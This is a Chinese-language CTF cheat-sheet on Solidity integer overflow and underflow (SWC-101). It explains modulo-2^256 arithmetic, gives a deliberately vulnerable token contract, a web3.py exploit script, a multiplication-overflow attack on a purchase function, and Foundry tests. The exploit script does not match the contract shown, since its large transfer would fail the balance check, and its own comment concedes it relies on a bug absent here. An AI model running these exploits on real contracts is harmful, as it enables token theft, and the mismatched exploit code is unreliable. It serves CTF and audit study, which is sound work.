---
title: Solidity 整数溢出 / 下溢（SWC-101）
category: blockchain
tags: [solidity, 整数溢出, 下溢, swc-101, ctf]
signals: [solidity 0.7 及以下, SafeMath, uint256 减法, 余额减到负数, unchecked 块, 大数余额, 转 token, 乘法溢出, isSolved 余额巨大]
difficulty: easy
source: "SWC Registry（SWC-101） / CTF-Wiki"
tools: [solidity, foundry, web3py]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 合约用 Solidity **< 0.8.0** 且没有 `SafeMath`，或用了 `unchecked { }` 块。
- 有 `balance[msg.sender] -= amount`、`amount * price` 这类算术。
- 题面："你只有 1 个 token，让余额变成 2^256-1"、"把你的钱变成很多"。
- 判定条件 `balanceOf[attacker] > 某个巨大值`。
- 关键词：溢出、下溢、overflow、underflow、SafeMath、unchecked。

## 二、原理

`uint256` 的算术是模 2^256：

- **下溢**：`0 - 1 = 2^256 - 1`（一个巨大的数）。
- **溢出**：`2^256 - 1 + 1 = 0`。

Solidity 0.8.0 起默认检查并 revert；但：
- 0.8 之前的合约完全暴露；
- `unchecked { }` 显式关闭检查；
- 一些手写汇编（`assembly`）也会绕过。

经典利用：先 `transfer` 一次让余额归零，再 `transfer` 更大的数 → 余额变成巨大值；或 `transfer` 时对**接收方**做 `-` 导致其余额溢出。

## 三、解题步骤

1. 看编译器版本（`pragma`）与是否 `SafeMath`。
2. 找所有加减乘，特别是 `-` 和先乘后加。
3. 构造输入让某步"从 0 减"，或让乘法超过 2^256。
4. 调用后检查余额是否变成巨大数。
5. 用巨大余额满足 `isSolved`。

## 四、可直接运行的脚本

漏洞合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;                 // 无溢出检查

contract Token {
    mapping(address => uint256) public balanceOf;
    constructor() { balanceOf[msg.sender] = 1000; }

    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "no balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;         // ← 若 to 的余额已是 2^256-1，这里会溢出成小数
    }
    function isSolved(address who) external view returns (bool) {
        return balanceOf[who] > 1e30;
    }
}
```

利用（web3.py）：

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://TARGET:8545"))
acct = w3.eth.accounts[0]
TOKEN = "0xTOKEN_CONTRACT"
ABI = [
    {"name": "balanceOf", "type": "function", "stateMutability": "view",
     "inputs": [{"name": "", "type": "address"}],
     "outputs": [{"name": "", "type": "uint256"}]},
    {"name": "transfer", "type": "function", "stateMutability": "nonpayable",
     "inputs": [{"name": "to", "type": "address"},
                {"name": "amount", "type": "uint256"}],
     "outputs": []},
]
tok = w3.eth.contract(address=TOKEN, abi=ABI)
me = w3.eth.accounts[1].address

# 关键：转给"余额为 0"的地址一个超过其余额的数字？
# 注意 underflow 发生在 sender 侧；overflow 发生在 receiver 侧。
# 若 transfer 里有 `balanceOf[to] -= x` 的错误方向，则：
tok.functions.transfer(me, 2**256 - 1).transact({"from": acct})
print(tok.functions.balanceOf(me).call())
```

溢出型（乘法）利用：

```solidity
// 漏洞：amount * price 溢出后变成很小 / 0
function buy(uint256 amount) external payable {
    uint256 cost = amount * price;        // 溢出 => cost 变 0
    require(msg.value >= cost);
    balanceOf[msg.sender] += amount;
}
// 攻击：amount = 2^255 + 1（配上 price=2），cost = (2^255+1)*2 mod 2^256 = 2
```

Foundry 复现：

```solidity
contract OverflowTest is Test {
    function testUnderflow() public {
        uint256 x = 0;
        unchecked { x -= 1; }
        assertEq(x, type(uint256).max);
    }
    function testOverflow() public {
        uint256 a = type(uint256).max;
        unchecked { a += 1; }
        assertEq(a, 0);
    }
}
```

## 五、常见坑 / 变体

- **0.8+ 也未必安全**：`unchecked` 块、内联汇编 `assembly { }`、`abi.encodePacked` 的截断。
- **加法溢出方向**：`balanceOf[to] += amount` 只有在 `to` 余额接近 2^256 时才溢出，常见于"先 underflow 再转给同一个人"。
- **`SafeMath` 只是库**：`using SafeMath for uint256` 后要确认每个运算都用了 `add/sub/mul` 而不是裸运算符。
- **`int` 与 `uint` 混用**：`int256` 的负数转 `uint256` 会变成巨大值。
- 变体：**时间戳/区块号参与的计算溢出**。
- 变体：**ERC20 的著名溢出漏洞**（BEC、SMT）：`_value * _sellRate` 溢出，一笔交易即可凭空造币。
- 变体：**下溢 + 重入**组合（CTF 里常见：先 reentrancy 让余额变 0，再 underflow）。
- 变体：**`abi.encodePacked` 哈希碰撞**（SWC-133），两个动态数组拼接后可伪造哈希。

## 六、参考来源

- [SWC Registry - SWC-101 Integer Overflow and Underflow](https://swcregistry.io/docs/SWC-101)
- [CTF-Wiki 整数溢出（Integer Overflow and Underflow）](https://ctf-wiki.org/blockchain/ethereum/attacks/overflow-underflow/)
- [Solidity 0.8.0 更新说明（默认检查溢出）](https://docs.soliditylang.org/en/latest/080-breaking-changes.html)
- [SPEC / EthTrust 安全级别规范（SWC 的维护替代）](https://entethalliance.org/specs/ethtrust-sl)
